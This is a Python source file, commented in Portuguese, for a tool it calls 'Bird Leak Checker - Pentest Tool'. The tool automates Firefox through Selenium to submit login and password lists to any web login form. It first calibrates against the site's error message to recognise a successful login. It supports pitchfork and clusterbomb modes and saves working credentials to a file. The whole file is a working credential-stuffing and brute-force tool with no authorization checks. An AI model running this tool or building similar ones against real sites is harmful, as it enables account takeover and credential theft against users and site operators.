#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# VERSAO APARENTEMENTE FULL OK, AGUARDANDO MAIS TESTES

import argparse
import time
import sys
import signal
import os
import logging
from typing import List, Tuple, Optional
from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException

# Inicializa Colorama
init(autoreset=True)

# Configuração de Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("error.log"),
        logging.StreamHandler(sys.stdout) # Opcional: remover se quiser output limpo no terminal
    ]
)

def setup_logger_results():
    """Configura logger específico para resultados (full e sucessos)"""
    logger = logging.getLogger('results')
    logger.setLevel(logging.INFO)
    logger.propagate = False
    
    # Handler para log completo
    fh_full = logging.FileHandler('log-full.txt')
    fh_full.setFormatter(logging.Formatter('%(message)s'))
    logger.addHandler(fh_full)
    
    return logger

result_logger = setup_logger_results()

def log_success(msg):
    """Escreve apenas sucessos no arquivo específico"""
    with open('logins-sucesso.txt', 'a', encoding='utf-8') as f:
        f.write(msg + '\n')

class BirdLeakChecker:
    def __init__(self, args):
        self.args = args
        self.driver = None
        self.calibration_error_msg = ""
        self.calibration_url = ""
        self.stop_requested = False

        # Element Selectors (Auto or Manual)
        self.sel_login = None
        self.sel_pass = None
        self.sel_btn = None
        self.sel_b1 = None # Botão prévio

    def setup_driver(self):
        """Configura o WebDriver Firefox em modo Anônimo"""
        options = Options()
        if self.args.headless:
            options.add_argument("--headless")
        
        # GARANTE MODO ANÔNIMO
        options.add_argument("-private")
        
        print(f"{Fore.CYAN}[*] Iniciando Firefox (Modo Anônimo)...")
        self.driver = webdriver.Firefox(options=options)
        self.driver.set_page_load_timeout(30)

    def close_driver(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass

    def smart_find_element(self, param_id=None, param_name=None, param_type=None, param_class=None, 
                          heuristic_tags=None, heuristic_attrs=None):
        """
        Lógica de prioridade:
        1. ID passado por argumento
        2. Name passado por argumento
        3. Type/Class passados por argumento
        4. Heurística automática (se argumentos forem None)
        """
        el = None
        
        # 1. Prioridade Absoluta: Parâmetros Manuais
        if param_id:
            try: return self.driver.find_element(By.ID, param_id)
            except: pass
        if param_name:
            try: return self.driver.find_element(By.NAME, param_name)
            except: pass
        if param_class:
            try: return self.driver.find_element(By.CLASS_NAME, param_class)
            except: pass
        if param_type:
            # Type geralmente precisa de tag, assumindo input ou button
            try: return self.driver.find_element(By.XPATH, f"//*[@type='{param_type}']")
            except: pass

        # Se o usuário forneceu parâmetros manuais e falhou, retorna None (não tenta auto para não confundir)
        if any([param_id, param_name, param_type, param_class]):
            return None

        # 2. Heurística Automática
        if heuristic_tags and heuristic_attrs:
            for tag in heuristic_tags:
                for attr, values in heuristic_attrs.items():
                    for val in values:
                        try:
                            # Busca insensível a maiúsculas/minúsculas para robustez
                            xpath = f"//{tag}[contains(translate(@{attr}, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{val}')]"
                            el = self.driver.find_element(By.XPATH, xpath)
                            if el.is_displayed():
                                return el
                        except:
                            continue
        return None

    def click_optional_b1(self):
        """Clica no botão prévio (ex: abrir modal de login) se configurado"""
        if any([self.args.B1id, self.args.B1name, self.args.B1type, self.args.B1class]):
            print(f"{Fore.YELLOW}[*] Buscando botão prévio (B1)...")
            b1 = self.smart_find_element(
                self.args.B1id, self.args.B1name, self.args.B1type, self.args.B1class
            )
            if b1:
                try:
                    b1.click()
                    time.sleep(self.args.wait_load)
                    print(f"{Fore.GREEN}[+] Botão prévio clicado.")
                except Exception as e:
                    print(f"{Fore.RED}[!] Erro ao clicar em B1: {e}")
            else:
                print(f"{Fore.RED}[!] Botão B1 configurado mas não encontrado.")

    def detect_elements(self):
        """Identifica campos de Login, Senha e Botão de Entrar"""
        print(f"{Fore.CYAN}[*] Analisando estrutura da página: {self.args.url}")
        
        # Login Field
        self.sel_login = self.smart_find_element(
            self.args.Lid, self.args.Lname, self.args.Ltype, self.args.Lclass,
            heuristic_tags=['input'],
            heuristic_attrs={'name': ['user', 'login', 'email', 'cpf', 'id'], 
                             'type': ['text', 'email'], 
                             'placeholder': ['e-mail', 'usuário', 'login']}
        )

        # Password Field
        self.sel_pass = self.smart_find_element(
            self.args.Pid, self.args.Pname, self.args.Ptype, self.args.Pclass,
            heuristic_tags=['input'],
            heuristic_attrs={'type': ['password'], 'name': ['pass', 'senha', 'key']}
        )

        # Button Field
        self.sel_btn = self.smart_find_element(
            self.args.Bid, self.args.Bname, self.args.Btype, self.args.Bclass,
            heuristic_tags=['button', 'input', 'a', 'div'],
            heuristic_attrs={'type': ['submit'], 'class': ['btn', 'button', 'login', 'entrar'], 
                             'id': ['login', 'btn', 'submit', 'entrar'],
                             'innerText': ['entrar', 'login', 'acessar', 'sign in']}
        )

        if not all([self.sel_login, self.sel_pass, self.sel_btn]):
            print(f"{Fore.RED}[!] FALHA NA DETECÇÃO AUTOMÁTICA.")
            print(f"{Fore.YELLOW}Campos encontrados: Login={bool(self.sel_login)}, Pass={bool(self.sel_pass)}, Button={bool(self.sel_btn)}")
            print(f"{Fore.WHITE}Por favor, utilize os parâmetros manuais (-Lid, -Pname, etc) conforme o --help.")
            sys.exit(1)
        
        print(f"{Fore.GREEN}[+] Elementos capturados com sucesso.")

    def extract_feedback_message(self):
        """
        Busca mensagens de erro/sucesso baseadas nos exemplos HTML fornecidos e classes comuns.
        Prioriza o parâmetro -Rclass se fornecido.
        """
        msg = "Msg não identificada"
        
        # 1. Se usuario passou classe de resposta especifica
        if self.args.Rclass:
            try:
                el = self.driver.find_element(By.CLASS_NAME, self.args.Rclass)
                return el.text.strip().replace('\n', ' ')
            except:
                pass

        # 2. Lista de XPATHS baseados nos exemplos do prompt e frameworks comuns (Bootstrap, Vue, React, SweetAlert)
        # Exemplo 1: css-18ouhwa, css-y7do1i
        # Exemplo 2: Vue-Toastification
        # Exemplo 3: alert alert-danger
        # Exemplo 4: error-tips-content
        # Exemplo 5: fieldset error
        
        xpaths = [
            "//*[contains(@class, 'toast')]",
            "//*[contains(@class, 'alert')]",
            "//*[contains(@class, 'error')]",
            "//*[contains(@class, 'warning')]",
            "//*[contains(@class, 'notification')]",
            "//*[contains(@role, 'alert')]",
            "//div[contains(@class, 'css-') and contains(text(), 'Invalid')]", # Genérico para React Styled Components
            "//div[contains(@class, 'css-') and contains(text(), 'incorret')]",
            "//*[@id='errorContent']",
            "//fieldset[contains(@class, 'error')]"
        ]

        found_texts = []
        for xpath in xpaths:
            try:
                elements = self.driver.find_elements(By.XPATH, xpath)
                for el in elements:
                    if el.is_displayed() and len(el.text) > 3:
                        found_texts.append(el.text.strip().replace('\n', ' '))
            except:
                continue
        
        if found_texts:
            # Retorna a mensagem mais longa encontrada (geralmente a mais descritiva)
            msg = max(found_texts, key=len)
        
        return msg

    def clear_session(self):
        """Limpa cookies, local storage e session storage para garantir nova tentativa limpa"""
        try:
            self.driver.delete_all_cookies()
            self.driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
        except:
            pass

    def perform_login_attempt(self, user, password, is_calibration=False):
        """Executa a ação de login | LINHA 247 INSERIDA POR MIM"""

        is_success = False
        try:
            # 1. Carrega URL
            self.driver.get(self.args.url)
            time.sleep(self.args.wait_load)
            
            # 2. Botão prévio opcional
            self.click_optional_b1()
            
            # 3. Redetecta elementos (necessário pois a página recarregou)
            self.detect_elements()
            
            # 4. Preenche formulário
            self.sel_login.clear()
            self.sel_login.send_keys(user)
            time.sleep(0.5)
            
            self.sel_pass.clear()
            self.sel_pass.send_keys(password)
            time.sleep(self.args.wait_login) # Tempo entre digitar e clicar
            
            # 5. Clica
            try:
                self.sel_btn.click()
            except ElementClickInterceptedException:
                self.driver.execute_script("arguments[0].click();", self.sel_btn)
            
            # 6. Espera resposta
            time.sleep(self.args.wait_response)
            
            # 7. Captura feedback
            feedback = self.extract_feedback_message()
            current_url = self.driver.current_url
            
            # Formata log
            log_entry = f"{user}:{password}:{feedback}"
            
            # Output no terminal
            if is_calibration:
                print(f"{Fore.MAGENTA}[CALIBRAÇÃO] {log_entry}")
                self.calibration_error_msg = feedback
                self.calibration_url = current_url
            else:
                # Lógica de Detecção de Sucesso:
                # Se a mensagem de erro for DIFERENTE da calibração E não for uma mensagem de erro genérica detectada
                # Ou se a URL mudou significativamente (saiu do /login)
                
                is_success = False
                
                # Critério 1: URL mudou (ex: saiu de login.php para dashboard.php)
                if current_url != self.calibration_url and "login" not in current_url:
                    is_success = True
                
                # Critério 2: Mensagem de erro padrão sumiu
                elif feedback != self.calibration_error_msg and len(feedback) < 5: 
                    # Se feedback for muito curto ou vazio, pode ser que logou e não tem erro
                    is_success = True
                
                # Critério 3: Mensagem de erro mudou explicitamente
                elif feedback != self.calibration_error_msg:
                    # Aqui é arriscado, pode ser outro erro. Vamos colorir de amarelo.
                    pass

                if is_success:
                    print(f"{Fore.GREEN}[SUCESSO] {log_entry}")
                    log_success(log_entry)
                    # Limpeza agressiva pós sucesso
                    self.clear_session()
                else:
                    print(f"{Fore.RED}[FALHA] {log_entry}")

                # Grava no log full sempre
                result_logger.info(log_entry)
            
            # Limpa sessão para próxima
            if not is_success:
                self.clear_session()

        except Exception as e:
            print(f"{Fore.RED}[ERRO DE EXECUÇÃO] {e}")
            logging.error(f"Erro tentando {user}:{password} -> {e}")
            self.clear_session()

    def calibrate(self):
        """Faz testes com credenciais falsas para aprender o comportamento de erro"""
        print(f"{Fore.YELLOW}[*] Iniciando calibração com credenciais inválidas...")
        fake_creds = [
            ("01234567890", "123321123456"),
            ("exemplo@test.mail", "Senha@t3ste26")
        ]
        
        for u, p in fake_creds:
            self.perform_login_attempt(u, p, is_calibration=True)
            
        print(f"{Fore.YELLOW}[*] Assinatura de erro capturada: '{self.calibration_error_msg}'")
        print(f"{Fore.YELLOW}[*] URL base de erro: '{self.calibration_url}'")
        print(f"{Fore.CYAN}[*] Calibração concluída. Iniciando ataque...")
        print(f"{Fore.WHITE}{'-'*50}")

    def run(self):
        # Prepara listas
        logins = []
        passwords = []

        # Carrega Logins
        if self.args.login_single:
            logins.append(self.args.login_single)
        elif self.args.login_list:
            if os.path.exists(self.args.login_list):
                with open(self.args.login_list, 'r', encoding='utf-8', errors='ignore') as f:
                    logins = [line.strip() for line in f if line.strip()]
            else:
                print(f"{Fore.RED}Arquivo de login não encontrado.")
                sys.exit(1)

        # Carrega Senhas
        if self.args.pass_single:
            passwords.append(self.args.pass_single)
        elif self.args.pass_list:
            if os.path.exists(self.args.pass_list):
                with open(self.args.pass_list, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            else:
                print(f"{Fore.RED}Arquivo de senhas não encontrado.")
                sys.exit(1)

        if not logins or not passwords:
            print(f"{Fore.RED}Listas de login ou senha vazias.")
            sys.exit(1)

        self.setup_driver()
        
        try:
            self.calibrate()
            
            if self.args.pitchfork:
                # Modo Pitchfork: 1:1 (L1:P1, L2:P2)
                limit = min(len(logins), len(passwords))
                print(f"{Fore.CYAN}[MODE] Pitchfork: {limit} combinações.")
                for i in range(limit):
                    if self.stop_requested: break
                    self.perform_login_attempt(logins[i], passwords[i])
            
            else:
                # Modo Clusterbomb (Default): Todos com Todos
                print(f"{Fore.CYAN}[MODE] Clusterbomb: {len(logins) * len(passwords)} combinações.")
                for u in logins:
                    for p in passwords:
                        if self.stop_requested: break
                        self.perform_login_attempt(u, p)

        except KeyboardInterrupt:
            self.handle_sigint(None, None)
        finally:
            self.close_driver()

    def handle_sigint(self, sig, frame):
        print(f"\n{Fore.RED}[!] Interrupção detectada (Ctrl+C).")
        choice = input(f"{Fore.YELLOW}Deseja encerrar o script? [S/n/nova_aba]: ").lower()
        if choice in ['s', 'y', '']:
            self.stop_requested = True
            self.close_driver()
            sys.exit(0)
        elif choice == 'nova_aba':
             print(f"{Fore.GREEN}Abrindo nova aba anônima para debug manual...")
             self.driver.execute_script("window.open('about:blank', '_blank');")
        else:
            print(f"{Fore.GREEN}Continuando...")

def parse_arguments():
    parser = argparse.ArgumentParser(description='Bird Leak Checker - Pentest Tool', add_help=False)
    
    # Grupos
    req = parser.add_argument_group('Obrigatórios / Básicos')
    req.add_argument('-u', '--url', required=True, help='URL alvo')
    req.add_argument('-l', dest='login_list', help='Arquivo de Logins')
    req.add_argument('--login', dest='login_single', help='Login único (string)')
    req.add_argument('-p', dest='pass_list', help='Arquivo de Senhas')
    req.add_argument('--password', dest='pass_single', help='Senha única (string)')
    
    timing = parser.add_argument_group('Timing e Controle')
    timing.add_argument('-Tlogin', dest='wait_login', type=float, default=1.0, help='Tempo digitando (s)')
    timing.add_argument('-s', dest='wait_response', type=float, default=1.0, help='Espera resposta login (s)')
    timing.add_argument('-T', dest='wait_load', type=float, default=3.0, help='Espera carga pagina (s)')
    timing.add_argument('--headless', action='store_true', help='Rodar sem interface gráfica')
    
    mode = parser.add_argument_group('Modos de Ataque')
    mode.add_argument('--pitchfork', action='store_true', help='Modo Login1:Pass1, Login2:Pass2')
    mode.add_argument('--clusterbomb', action='store_true', help='Modo Todos Login x Todas Senhas (Padrão)')

    manual = parser.add_argument_group('Seletores Manuais (Sobrescrevem auto)')
    manual.add_argument('-Lid', help='ID do campo Login')
    manual.add_argument('-Lname', help='Name do campo Login')
    manual.add_argument('-Ltype', help='Type do campo Login')
    manual.add_argument('-Lclass', help='Class do campo Login')
    
    manual.add_argument('-Pid', help='ID do campo Senha')
    manual.add_argument('-Pname', help='Name do campo Senha')
    manual.add_argument('-Ptype', help='Type do campo Senha')
    manual.add_argument('-Pclass', help='Class do campo Senha')
    
    manual.add_argument('-Bid', help='ID do Botão Entrar')
    manual.add_argument('-Bname', help='Name do Botão Entrar')
    manual.add_argument('-Btype', help='Type do Botão Entrar')
    manual.add_argument('-Bclass', help='Class do Botão Entrar')

    manual.add_argument('-B1id', help='ID Botão Prévio')
    manual.add_argument('-B1name', help='Name Botão Prévio')
    manual.add_argument('-B1type', help='Type Botão Prévio')
    manual.add_argument('-B1class', help='Class Botão Prévio')
    
    manual.add_argument('-Rclass', help='Class da DIV de Resposta/Erro')
    
    help_arg = parser.add_argument_group('Ajuda')
    help_arg.add_argument('--help', action='help', help='Mostra esta mensagem')

    return parser.parse_args()

if __name__ == "__main__":
    # Tratamento global de Ctrl+C
    signal.signal(signal.SIGINT, lambda s, f: None) # Deixa a classe tratar
    
    args = parse_arguments()
    
    # Validação mínima
    if not (args.login_list or args.login_single) or not (args.pass_list or args.pass_single):
        print(f"{Fore.RED}Erro: Você precisa fornecer Login e Senha (arquivo ou string). Use --help.")
        sys.exit(1)

    tool = BirdLeakChecker(args)
    tool.run()
